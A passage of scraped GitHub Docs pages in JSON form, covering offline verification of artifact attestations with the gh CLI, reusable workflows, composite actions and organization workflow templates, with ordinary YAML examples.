        "text": "First, get the attestation bundle from the attestation API."
      },
      {
        "type": "paragraph",
        "text": "You can do so with the following command from a machine that is online:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh attestation download PATH/TO/YOUR/BUILD/ARTIFACT-BINARY -R ORGANIZATION_NAME/REPOSITORY_NAME"
      },
      {
        "type": "paragraph",
        "text": "Here is example output from that command:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "Wrote attestations to file sha256:ae57936def59bc4c75edd3a837d89bcefc6d3a5e31d55a6fa7a71624f92c3c3b.jsonl.\nAny previous content has been overwritten\n\nThe trusted metadata is now available at sha256:ae57936def59bc4c75edd3a837d89bcefc6d3a5e31d55a6fa7a71624f92c3c3b.jsonl"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Step 2: Download trusted roots"
      },
      {
        "type": "paragraph",
        "text": "Next, get the key material from the trusted roots."
      },
      {
        "type": "paragraph",
        "text": "Artifact attestations uses the Sigstore public good instance for public repositories, and GitHub's Sigstore instance for private repositories. You can use one command to get both trusted roots:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh attestation trusted-root > trusted_root.jsonl"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Updating trusted root information in an offline environment"
      },
      {
        "type": "paragraph",
        "text": "It's best practice to generate a newtrusted_root.jsonlfile any time you are importing new signed material into your offline environment."
      },
      {
        "type": "paragraph",
        "text": "The key material intrusted_root.jsonldoes not have a built-in expiration date, so anything signed before you generate the trusted root file will continue to successfully verify. Anything signed after the file is generated will verify until that Sigstore instance rotates its key material, which typically happens a few times per year. You will not know if key material has been revoked since you last generated the trusted root file."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Step 3: Perform offline verification"
      },
      {
        "type": "paragraph",
        "text": "Now, you are ready to verify the artifact offline."
      },
      {
        "type": "paragraph",
        "text": "You should import into your offline environment:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "GitHub CLI",
          "Your artifact",
          "The bundle file",
          "The trusted root file"
        ]
      },
      {
        "type": "paragraph",
        "text": "You can then perform offline verification with the following command:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh attestation verify PATH/TO/YOUR/BUILD/ARTIFACT-BINARY -R ORGANIZATION_NAME/REPOSITORY_NAME --bundle sha256:ae57936def59bc4c75edd3a837d89bcefc6d3a5e31d55a6fa7a71624f92c3c3b.jsonl --custom-trusted-root trusted_root.jsonl"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Conclusion"
      },
      {
        "type": "paragraph",
        "text": "You are now verifying artifact attestations in an offline environment. We recommend importing a new trusted root whenever you are introducing new signed artifacts to your offline environment."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/sharing-automations/avoiding-duplication",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "About reusable workflows and composite actions"
      },
      {
        "type": "paragraph",
        "text": "Reusable workflows and composite actions are two ways to avoid duplicating the content of workflows."
      },
      {
        "type": "paragraph",
        "text": "Reusable workflowsallow you to reuse an entire workflow, including all of its jobs and steps. This is particularly useful when you have a complete CI/CD process that you want to use across multiple repositories. Reusable workflows can be centrally maintained, in one location, but used in many repositories across your organization."
      },
      {
        "type": "paragraph",
        "text": "Composite actionsallow you to combine multiple steps into a single action. You can then run this bundle of steps as a single step within a workflow. This is useful if you have a sequence of steps that will be used in more than one workflow. Composite actions allow you refactor long YAML workflow files into much smaller files and avoid copying and pasting between workflow files."
      },
      {
        "type": "paragraph",
        "text": "Reusable workflows and composite actions solve similar problems, but have a few important differences. Most of the time you can use either solution. But some of the time, you’ll need to use one or the other, as described later in this article."
      },
      {
        "type": "paragraph",
        "text": "For details of how to create and use reusable workflows and composite actions, seeReusing workflowsandCreating a composite action."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Comparison of reusable workflows and composite actions"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Workflow jobs- Composite actions contain a series of steps, that are run as a single step within the caller workflow. Unlike reusable workflows, they cannot contain jobs.",
          "Logging- When a composite action runs, the log will show just the step in the caller workflow that ran the composite action, not the individual steps within the composite action. With reusable workflows, every job and step is logged separately.",
          "Specifying runners- Reusable workflows contain one or more jobs. As with all workflow jobs, the jobs in a reusable workflow specify the type of machine on which the job will run. Therefore, if the steps must be run on a type of machine that might be different from the machine chosen for the calling workflow job, then you should use a reusable workflow, not a composite action.",
          "Passing output to steps- A composite action is run as a step within a workflow job, and you can have multiple steps before or after the step that runs the composite action. Reusable workflows are called directly within a job, and not from within a job step. You can't add steps to a job after calling a reusable workflow, so you can't useGITHUB_ENVto pass values to subsequent job steps in the caller workflow."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Key differences between reusable workflows and composite actions"
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/sharing-automations/creating-workflow-templates-for-your-organization",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Overview"
      },
      {
        "type": "paragraph",
        "text": "Workflow templates allow everyone in your organization who has permission to create workflows to do so more quickly and easily. When you create a new workflow, you can choose a workflow template and some or all of the work of writing the workflow will be done for you. You can use workflow templates as a starting place to build your custom workflow or use them as-is. This not only saves time, it promotes consistency and best practice across your organization."
      },
      {
        "type": "paragraph",
        "text": "GitHub provides ready-to-use workflow templates for the following high level categories:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Deployment (CD). For more information, seeAbout continuous deployment with GitHub Actions."
        ]
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Security. For more information, seeConfiguring advanced setup for code scanning."
        ]
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Continuous Integration (CI). For more information, seeAbout continuous integration with GitHub Actions.",
          "Automation. Automation workflow templates offer solutions for automating workflows, such as triaging pull requests and applying a label based on the paths that are modified in the pull request, or greeting users who are first time contributors to the repository."
        ]
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Because workflow templates require a public.githubrepository, they are not available for Enterprise Managed Users."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Creating a workflow template"
      },
      {
        "type": "paragraph",
        "text": "Workflow templates can be created by users with write access to the organization'spublic.githubrepository. These can then be used by organization members who have permission to create workflows."
      },
      {
        "type": "paragraph",
        "text": "Workflow templates created by users can only be used to create workflows in public repositories. Organizations using GitHub Enterprise Cloud can also use workflow templates to create workflows in private repositories. For more information, see theGitHub Enterprise Cloud documentation."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "To avoid duplication among workflow templates you can call reusable workflows from within a workflow. This can help make your workflows easier to maintain. For more information, seeReusing workflows."
      },
      {
        "type": "paragraph",
        "text": "This procedure demonstrates how to create a workflow template and metadata file. The metadata file describes how the workflow templates will be presented to users when they are creating a new workflow."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "If it doesn't already exist, create a newpublicrepository named.githubin your organization.",
          "Create a directory namedworkflow-templates.",
          "Create your new workflow file inside theworkflow-templatesdirectory.If you need to refer to a repository's default branch, you can use the$default-branchplaceholder. When a workflow is created the placeholder will be automatically replaced with the name of the repository's default branch.For example, this file namedocto-organization-ci.ymldemonstrates a basic workflow.YAMLname: Octo Organization CI\n\non:\n  push:\n    branches: [ $default-branch ]\n  pull_request:\n    branches: [ $default-branch ]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Run a one-line script\n        run: echo Hello from Octo Organizationname:OctoOrganizationCIon:push:branches:[$default-branch]pull_request:branches:[$default-branch]jobs:build:runs-on:ubuntu-lateststeps:-uses:actions/checkout@v4-name:Runaone-linescriptrun:echoHellofromOctoOrganization",
          "Create a metadata file inside theworkflow-templatesdirectory. The metadata file must have the same name as the workflow file, but instead of the.ymlextension, it must be appended with.properties.json. For example, this file namedocto-organization-ci.properties.jsoncontains the metadata for a workflow file namedocto-organization-ci.yml:JSON{\n    \"name\": \"Octo Organization Workflow\",\n    \"description\": \"Octo Organization CI workflow template.\",\n    \"iconName\": \"example-icon\",\n    \"categories\": [\n        \"Go\"\n    ],\n    \"filePatterns\": [\n        \"package.json$\",\n        \"^Dockerfile\",\n        \".*\\\\.md$\"\n    ]\n}{\"name\":\"Octo Organization Workflow\",\"description\":\"Octo Organization CI workflow template.\",\"iconName\":\"example-icon\",\"categories\":[\"Go\"],\"filePatterns\":[\"package.json$\",\"^Dockerfile\",\".*\\\\.md$\"]}name-Required.The name of the workflow. This is displayed in the list of available workflows.description-Required.The description of the workflow. This is displayed in the list of available workflows.iconName-Optional.Specifies an icon for the workflow that is displayed in the list of workflows.iconNamecan one of the following types:An SVG file that is stored in theworkflow-templatesdirectory. To reference a file, the value must be the file name without the file extension. For example, an SVG file namedexample-icon.svgis referenced asexample-icon.An icon from GitHub's set ofOcticons. To reference an octicon, the value must beocticon <icon name>. For example,octicon smiley.categories-Optional.Defines the categories that the workflow is shown under. You can use category names from the following lists:General category names from thestarter-workflowsrepository.Linguist languages from the list in thelinguistrepository.Supported tech stacks from the list in thestarter-workflowsrepository.filePatterns-Optional.Allows the workflow to be used if the user's repository has a file in its root directory that matches a defined regular expression.",
          "name-Required.The name of the workflow. This is displayed in the list of available workflows.",
          "description-Required.The description of the workflow. This is displayed in the list of available workflows.",
          "iconName-Optional.Specifies an icon for the workflow that is displayed in the list of workflows.iconNamecan one of the following types:An SVG file that is stored in theworkflow-templatesdirectory. To reference a file, the value must be the file name without the file extension. For example, an SVG file namedexample-icon.svgis referenced asexample-icon.An icon from GitHub's set ofOcticons. To reference an octicon, the value must beocticon <icon name>. For example,octicon smiley.",
          "An SVG file that is stored in theworkflow-templatesdirectory. To reference a file, the value must be the file name without the file extension. For example, an SVG file namedexample-icon.svgis referenced asexample-icon.",
          "An icon from GitHub's set ofOcticons. To reference an octicon, the value must beocticon <icon name>. For example,octicon smiley.",
          "categories-Optional.Defines the categories that the workflow is shown under. You can use category names from the following lists:General category names from thestarter-workflowsrepository.Linguist languages from the list in thelinguistrepository.Supported tech stacks from the list in thestarter-workflowsrepository.",
          "General category names from thestarter-workflowsrepository.",
          "Linguist languages from the list in thelinguistrepository.",
          "Supported tech stacks from the list in thestarter-workflowsrepository.",
          "filePatterns-Optional.Allows the workflow to be used if the user's repository has a file in its root directory that matches a defined regular expression."
        ]
      },
      {
        "type": "paragraph",
        "text": "To add another workflow template, add your files to the sameworkflow-templatesdirectory."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Next steps"
      },
      {
        "type": "paragraph",
        "text": "To continue learning about GitHub Actions, seeUsing workflow templates."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/sharing-automations/reusing-workflows",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Overview"
      },
      {
        "type": "paragraph",
        "text": "Rather than copying and pasting from one workflow to another, you can make workflows reusable. You and anyone with access to the reusable workflow can then call the reusable workflow from another workflow."
      },
      {
        "type": "paragraph",
        "text": "Reusing workflows avoids duplication. This makes workflows easier to maintain and allows you to create new workflows more quickly by building on the work of others, just as you do with actions. Workflow reuse also promotes best practice by helping you to use workflows that are well designed, have already been tested, and have been proven to be effective. Your organization can build up a library of reusable workflows that can be centrally maintained."
      },
      {
        "type": "paragraph",
        "text": "The diagram below shows an in-progress workflow run that uses a reusable workflow."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "After each of three build jobs on the left of the diagram completes successfully, a dependent job called \"Deploy\" is run.",
          "The \"Deploy\" job calls a reusable workflow that contains three jobs: \"Staging\", \"Review\", and \"Production.\"",
          "The \"Production\" deployment job only runs after the \"Staging\" job has completed successfully.",
          "When a job targets an environment, the workflow run displays a progress bar that shows the number of steps in the job. In the diagram below, the \"Production\" job contains 8 steps, with step 6 currently being processed.",
          "Using a reusable workflow to run deployment jobs allows you to run those jobs for each build without duplicating code in workflows."
        ]
      },
      {
        "type": "paragraph",
        "text": "A workflow that uses another workflow is referred to as a \"caller\" workflow. The reusable workflow is a \"called\" workflow. One caller workflow can use multiple called workflows. Each called workflow is referenced in a single line. The result is that the caller workflow file may contain just a few lines of YAML, but may perform a large number of tasks when it's run. When you reuse a workflow, the entire called workflow is used, just as if it was part of the caller workflow."
      },
      {
        "type": "paragraph",
        "text": "If you reuse a workflow from a different repository, any actions in the called workflow run as if they were part of the caller workflow. For example, if the called workflow usesactions/checkout, the action checks out the contents of the repository that hosts the caller workflow, not the called workflow."
      },
      {
        "type": "paragraph",
        "text": "When a reusable workflow is triggered by a caller workflow, thegithubcontext is always associated with the caller workflow. The called workflow is automatically granted access togithub.tokenandsecrets.GITHUB_TOKEN. For more information about thegithubcontext, seeAccessing contextual information about workflow runs."
      },
      {
        "type": "paragraph",
        "text": "You can view the reused workflows referenced in your GitHub Actions workflows as dependencies in the dependency graph of the repository containing your workflows. For more information, see “About the dependency graph.”"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Reusable workflows and composite actions"
      },
      {
        "type": "paragraph",
        "text": "Reusable workflows and composite actions both help you to avoid duplication. Whereas reusable workflows allow you to reuse an entire workflow, with multiple jobs and steps, composite actions combine multiple steps that you can then run within a job step, just like any other action. For more information, seeAvoiding duplication."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Reusable workflows and workflow templates"
      },
      {
        "type": "paragraph",
        "text": "Workflow templates allow everyone in your organization who has permission to create workflows to do so more quickly and easily. When people create a new workflow, they can choose a workflow template and some or all of the work of writing the workflow will be done for them. Within a workflow template, you can also reference reusable workflows to make it easy for people to benefit from reusing centrally managed workflow code. If you use a commit SHA when referencing the reusable workflow, you can ensure that everyone who reuses that workflow will always be using the same YAML code. However, if you reference a reusable workflow by a tag or branch, be sure that you can trust that version of the workflow. For more information, seeSecurity hardening for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "For more information, seeCreating workflow templates for your organization."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Access to reusable workflows"
      },
      {
        "type": "paragraph",
        "text": "A reusable workflow can be used by another workflow if any of the following is true:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Both workflows are in the same repository.",
          "The called workflow is stored in a public repository, and your organization allows you to use public reusable workflows.",
          "The called workflow is stored in a private repository and the settings for that repository allow it to be accessed. For more information, seeSharing actions and workflows with your organizationandSharing actions and workflows from your private repository."
        ]
      },
      {
        "type": "paragraph",
        "text": "The following table shows the accessibility of reusable workflows to a caller workflow, depending on the visibility of the host repository."
      },
      {
        "type": "paragraph",
        "text": "TheActions permissionson the callers repository's Actions settings page must be configured to allow the use of actions and reusable workflows - seeManaging GitHub Actions settings for a repository."
      },
      {
        "type": "paragraph",
        "text": "For private repositories, theAccesspolicy on the Actions settings page of the called workflow's repository must be explicitly configured to allow access from repositories containing caller workflows - seeManaging GitHub Actions settings for a repository."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "To enhance security, GitHub Actions does not support redirects for actions or reusable workflows. This means that when the owner, name of an action's repository, or name of an action is changed, any workflows using that action with the previous name will fail."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using runners"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using GitHub-hosted runners"
      },
      {
        "type": "paragraph",
        "text": "The assignment of GitHub-hosted runners is always evaluated using only the caller's context. Billing for GitHub-hosted runners is always associated with the caller. The caller workflow cannot use GitHub-hosted runners from the called repository. For more information, seeUsing GitHub-hosted runners."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using self-hosted runners"
      },
      {
        "type": "paragraph",
        "text": "Called workflows that are owned by the same user or organization as the caller workflow can access self-hosted runners from the caller's context. This means that a called workflow can access self-hosted runners that are:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "In the caller repository",
          "In the caller repository's organization, provided that the runner has been made available to the caller repository"
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Limitations"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "You can connect up to four levels of workflows. For more information, seeNesting reusable workflows.",
          "You can call a maximum of 20 unique reusable workflows from a single workflow file. This limit includes any trees of nested reusable workflows that may be called starting from your top-level caller workflow file.For example,top-level-caller-workflow.yml→called-workflow-1.yml→called-workflow-2.ymlcounts as 2 reusable workflows.",
          "Any environment variables set in anenvcontext defined at the workflow level in the caller workflow are not propagated to the called workflow. For more information, seeStore information in variablesandAccessing contextual information about workflow runs.",
          "Similarly, environment variables set in theenvcontext, defined in the called workflow, are not accessible in theenvcontext of the caller workflow. Instead, you must use outputs of the reusable workflow. For more information, seeUsing outputs from a reusable workflow.",
          "To reuse variables in multiple workflows, set them at the organization, repository, or environment levels and reference them using thevarscontext. For more information seeStore information in variablesandAccessing contextual information about workflow runs.",
          "Reusable workflows are called directly within a job, and not from within a job step. You cannot, therefore, useGITHUB_ENVto pass values to job steps in the caller workflow."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Creating a reusable workflow"
      },
      {
        "type": "paragraph",
        "text": "Reusable workflows are YAML-formatted files, very similar to any other workflow file. As with other workflow files, you locate reusable workflows in the.github/workflowsdirectory of a repository. Subdirectories of theworkflowsdirectory are not supported."
      },
      {
        "type": "paragraph",
        "text": "For a workflow to be reusable, the values foronmust includeworkflow_call:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  workflow_call:"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using inputs and secrets in a reusable workflow"
      },
      {
        "type": "paragraph",
        "text": "You can define inputs and secrets, which can be passed from the caller workflow and then used within the called workflow. There are three stages to using an input or a secret in a reusable workflow."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "In the reusable workflow, use theinputsandsecretskeywords to define inputs or secrets that will be passed from a caller workflow.on:workflow_call:inputs:config-path:required:truetype:stringsecrets:personal_access_token:required:trueFor details of the syntax for defining inputs and secrets, seeon.workflow_call.inputsandon.workflow_call.secrets.",
          "In the reusable workflow, reference the input or secret that you defined in theonkey in the previous step.NoteIf the secrets are inherited by usingsecrets: inheritin the calling workflow, you can reference them even if they are not explicitly defined in theonkey. For more information, seeWorkflow syntax for GitHub Actions.jobs:reusable_workflow_job:runs-on:ubuntu-lateststeps:-uses:actions/labeler@v4with:repo-token:${{secrets.personal_access_token}}configuration-path:${{inputs.config-path}}In the example above,personal_access_tokenis a secret that's defined at the repository or organization level.WarningEnvironment secrets cannot be passed from the caller workflow ason.workflow_calldoes not support theenvironmentkeyword. If you includeenvironmentin the reusable workflow at the job level, the environment secret will be used, and not the secret passed from the caller workflow. For more information, seeManaging environments for deploymentandWorkflow syntax for GitHub Actions.",
          "Pass the input or secret from the caller workflow.To pass named inputs to a called workflow, use thewithkeyword in a job. Use thesecretskeyword to pass named secrets. For inputs, the data type of the input value must match the type specified in the called workflow (either boolean, number, or string).jobs:call-workflow-passing-data:uses:octo-org/example-repo/.github/workflows/reusable-workflow.yml@mainwith:config-path:.github/labeler.ymlsecrets:personal_access_token:${{secrets.token}}Workflows that call reusable workflows in the same organization or enterprise can use theinheritkeyword to implicitly pass the secrets.jobs:call-workflow-passing-data:uses:octo-org/example-repo/.github/workflows/reusable-workflow.yml@mainwith:config-path:.github/labeler.ymlsecrets:inherit"
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example reusable workflow"
      },
      {
        "type": "paragraph",
        "text": "This reusable workflow file namedworkflow-B.yml(we'll refer to this later in theexample caller workflow) takes an input string and a secret from the caller workflow and uses them in an action."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Reusable workflow example\n\non:\n  workflow_call:\n    inputs:\n      config-path:\n        required: true\n        type: string\n    secrets:\n      token:\n        required: true\n\njobs:\n  triage:\n    runs-on: ubuntu-latest\n    steps:\n    - uses: actions/labeler@v4\n      with:\n        repo-token: ${{ secrets.token }}\n        configuration-path: ${{ inputs.config-path }}"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Calling a reusable workflow"
      },
      {
        "type": "paragraph",
        "text": "You call a reusable workflow by using theuseskeyword. Unlike when you are using actions within a workflow, you call reusable workflows directly within a job, and not from within job steps."
      },
      {
        "type": "paragraph",
        "text": "jobs.<job_id>.uses"
      },
      {
        "type": "paragraph",
        "text": "You reference reusable workflow files using one of the following syntaxes:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "{owner}/{repo}/.github/workflows/{filename}@{ref}for reusable workflows in public and private repositories.",
          "./.github/workflows/{filename}for reusable workflows in the same repository."
        ]
      },
      {
        "type": "paragraph",
        "text": "In the first option,{ref}can be a SHA, a release tag, or a branch name. If a release tag and a branch have the same name, the release tag takes precedence over the branch name. Using the commit SHA is the safest option for stability and security. For more information, seeSecurity hardening for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "If you use the second syntax option (without{owner}/{repo}and@{ref}) the called workflow is from the same commit as the caller workflow. Ref prefixes such asrefs/headsandrefs/tagsare not allowed. You cannot use contexts or expressions in this keyword."
      },
      {
        "type": "paragraph",
        "text": "You can call multiple workflows, referencing each in a separate job."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  call-workflow-1-in-local-repo:\n    uses: octo-org/this-repo/.github/workflows/workflow-1.yml@172239021f7ba04fe7327647b213799853a9eb89\n  call-workflow-2-in-local-repo:\n    uses: ./.github/workflows/workflow-2.yml\n  call-workflow-in-another-repo:\n    uses: octo-org/another-repo/.github/workflows/workflow.yml@v1"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Passing inputs and secrets to a reusable workflow"
      },
      {
        "type": "paragraph",
        "text": "To pass named inputs to a called workflow, use thewithkeyword in a job. Use thesecretskeyword to pass named secrets. For inputs, the data type of the input value must match the type specified in the called workflow (either boolean, number, or string)."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  call-workflow-passing-data:\n    uses: octo-org/example-repo/.github/workflows/reusable-workflow.yml@main\n    with:\n      config-path: .github/labeler.yml\n    secrets:\n      personal_access_token: ${{ secrets.token }}"
      },
      {
        "type": "paragraph",
        "text": "Workflows that call reusable workflows in the same organization or enterprise can use theinheritkeyword to implicitly pass the secrets."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  call-workflow-passing-data:\n    uses: octo-org/example-repo/.github/workflows/reusable-workflow.yml@main\n    with:\n      config-path: .github/labeler.yml\n    secrets: inherit"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using a matrix strategy with a reusable workflow"
      },
      {
        "type": "paragraph",
        "text": "Jobs using the matrix strategy can call a reusable workflow."
      },
      {
        "type": "paragraph",
        "text": "A matrix strategy lets you use variables in a single job definition to automatically create multiple job runs that are based on the combinations of the variables. For example, you can use a matrix strategy to pass different inputs to a reusable workflow. For more information about matrices, seeRunning variations of jobs in a workflow."
      },
      {
        "type": "paragraph",
        "text": "This example job below calls a reusable workflow and references the matrix context by defining the variabletargetwith the values[dev, stage, prod]. It will run three jobs, one for each value in the variable."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  ReuseableMatrixJobForDeployment:\n    strategy:\n      matrix:\n        target: [dev, stage, prod]\n    uses: octocat/octo-repo/.github/workflows/deployment.yml@main\n    with:\n      target: ${{ matrix.target }}"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Supported keywords for jobs that call a reusable workflow"
      },
      {
        "type": "paragraph",
        "text": "When you call a reusable workflow, you can only use the following keywords in the job containing the call:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "jobs.<job_id>.name",
          "jobs.<job_id>.uses",
          "jobs.<job_id>.with",
          "jobs.<job_id>.with.<input_id>",
          "jobs.<job_id>.secrets",
          "jobs.<job_id>.secrets.<secret_id>",
          "jobs.<job_id>.secrets.inherit",
          "jobs.<job_id>.strategy",
          "jobs.<job_id>.needs",
          "jobs.<job_id>.if",
          "jobs.<job_id>.concurrency",
          "jobs.<job_id>.permissionsNoteIfjobs.<job_id>.permissionsis not specified in the calling job, the called workflow will have the default permissions for theGITHUB_TOKEN. For more information, seeAutomatic token authentication.TheGITHUB_TOKENpermissions passed from the caller workflow can be only downgraded (not elevated) by the called workflow.If you usejobs.<job_id>.concurrency.cancel-in-progress: true, don't use the same value forjobs.<job_id>.concurrency.groupin the called and caller workflows as this will cause the workflow that's already running to be cancelled. A called workflow uses the name of its caller workflow in ${{ github.workflow }}, so using this context as the value ofjobs.<job_id>.concurrency.groupin both caller and called workflows will cause the caller workflow to be cancelled when the called workflow runs.",
          "Ifjobs.<job_id>.permissionsis not specified in the calling job, the called workflow will have the default permissions for theGITHUB_TOKEN. For more information, seeAutomatic token authentication.",
          "TheGITHUB_TOKENpermissions passed from the caller workflow can be only downgraded (not elevated) by the called workflow.",
          "If you usejobs.<job_id>.concurrency.cancel-in-progress: true, don't use the same value forjobs.<job_id>.concurrency.groupin the called and caller workflows as this will cause the workflow that's already running to be cancelled. A called workflow uses the name of its caller workflow in ${{ github.workflow }}, so using this context as the value ofjobs.<job_id>.concurrency.groupin both caller and called workflows will cause the caller workflow to be cancelled when the called workflow runs."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example caller workflow"
      },
      {
        "type": "paragraph",
        "text": "This workflow file calls two workflow files. The second of these,workflow-B.yml(shown in theexample reusable workflow), is passed an input (config-path) and a secret (token)."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Call a reusable workflow\n\non:\n  pull_request:\n    branches:\n      - main\n\njobs:\n  call-workflow:\n    uses: octo-org/example-repo/.github/workflows/workflow-A.yml@v1\n\n  call-workflow-passing-data:\n    permissions:\n      contents: read\n      pull-requests: write\n    uses: octo-org/example-repo/.github/workflows/workflow-B.yml@main\n    with:\n      config-path: .github/labeler.yml\n    secrets:\n      token: ${{ secrets.GITHUB_TOKEN }}"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Nesting reusable workflows"
      },
      {
        "type": "paragraph",
        "text": "You can connect a maximum of four levels of workflows - that is, the top-level caller workflow and up to three levels of reusable workflows. For example:caller-workflow.yml→called-workflow-1.yml→called-workflow-2.yml→called-workflow-3.yml. Loops in the workflow tree are not permitted."
      },
      {
        "type": "paragraph",
        "text": "From within a reusable workflow you can call another reusable workflow."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Reusable workflow\n\non:\n  workflow_call:\n\njobs:\n  call-another-reusable:\n    uses: octo-org/example-repo/.github/workflows/another-reusable.yml@v1"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Passing secrets to nested workflows"
      },
      {
        "type": "paragraph",
        "text": "You can usejobs.<job_id>.secretsin a calling workflow to pass named secrets to a directly called workflow. Alternatively, you can usejobs.<job_id>.secrets.inheritto pass all of the calling workflow's secrets to a directly called workflow. For more information, see the sectionReusing workflowsabove, and the reference articleWorkflow syntax for GitHub Actions. Secrets are only passed to directly called workflow, so in the workflow chain A > B > C, workflow C will only receive secrets from A if they have been passed from A to B, and then from B to C."
      },
      {
        "type": "paragraph",
        "text": "In the following example, workflow A passes all of its secrets to workflow B, by using theinheritkeyword, but workflow B only passes one secret to workflow C. Any of the other secrets passed to workflow B are not available to workflow C."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  workflowA-calls-workflowB:\n    uses: octo-org/example-repo/.github/workflows/B.yml@main\n    secrets: inherit # pass all secrets"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  workflowB-calls-workflowC:\n    uses: different-org/example-repo/.github/workflows/C.yml@main\n    secrets:\n      repo-token: ${{ secrets.personal_access_token }} # pass just this secret"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Access and permissions"
      },
      {
        "type": "paragraph",
        "text": "A workflow that contains nested reusable workflows will fail if any of the nested workflows is inaccessible to the initial caller workflow. For more information, seeReusing workflows."
      },
      {
        "type": "paragraph",
        "text": "GITHUB_TOKENpermissions can only be the same or more restrictive in nested workflows. For example, in the workflow chain A > B > C, if workflow A haspackage: readtoken permission, then B and C cannot havepackage: writepermission. For more information, seeAutomatic token authentication."
      },
      {
        "type": "paragraph",
        "text": "For information on how to use the API to determine which workflow files were involved in a particular workflow run, seeMonitoring which workflows are being used."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using outputs from a reusable workflow"
      },
      {
        "type": "paragraph",
        "text": "A reusable workflow may generate data that you want to use in the caller workflow. To use these outputs, you must specify them as the outputs of the reusable workflow."
      },
      {
        "type": "paragraph",
        "text": "If a reusable workflow that sets an output is executed with a matrix strategy, the output will be the output set by the last successful completing reusable workflow of the matrix which actually sets a value.\nThat means if the last successful completing reusable workflow sets an empty string for its output, and the second last successful completing reusable workflow sets an actual value for its output, the output will contain the value of the second last completing reusable workflow."
      },
      {
        "type": "paragraph",
        "text": "The following reusable workflow has a single job containing two steps. In each of these steps we set a single word as the output: \"hello\" and \"world.\" In theoutputssection of the job, we map these step outputs to job outputs called:output1andoutput2. In theon.workflow_call.outputssection we then define two outputs for the workflow itself, one calledfirstwordwhich we map tooutput1, and one calledsecondwordwhich we map tooutput2."
      },
      {
        "type": "paragraph",
        "text": "Thevaluemust be set to the value of a job-level output within the called workflow. Step-level outputs must first be mapped to job-level outputs as shown below."
      },
      {
        "type": "paragraph",
        "text": "For more information, seePassing information between jobsandWorkflow syntax for GitHub Actions."
      },
      {
        "type": "code",
        "language": "yaml",
